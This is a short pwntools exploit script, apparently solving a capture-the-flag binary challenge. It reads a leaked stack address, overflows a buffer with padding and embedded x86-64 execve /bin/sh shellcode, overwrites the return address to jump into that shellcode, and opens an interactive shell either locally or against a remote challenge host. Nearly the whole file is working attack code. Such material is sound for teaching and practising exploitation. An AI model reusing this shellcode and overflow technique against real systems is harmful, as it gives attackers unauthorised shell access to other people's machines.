from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('0.cloud.chals.io', 22808)
    else:
        return process(e.path)


def ret_leak():
    p.recvuntil(b'SHELLS:')
    leak = int(p.recvline().strip(b'\n'), 16)
    return leak


def send_sploit(leak):
    '''https://systemoverlord.com/2014/06/05/minimal-x86-64-shellcode-for-binsh/'''
    shellcode = b'\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x31\xc0\x99\x31\xf6\x54\x5f\xb0\x3b\x0f\x05'
    log.info('Using SystemOverlord Minimal Shellcode: %s' % disasm(shellcode))

    chain = cyclic(20)
    chain += shellcode
    chain += cyclic(23)
    chain += p64(leak+20)

    p.sendline(chain)
    p.interactive()


p = start()

leak = ret_leak()
log.info("[+] Leak: %s" % hex(leak))
send_sploit(leak)

p.interactive()
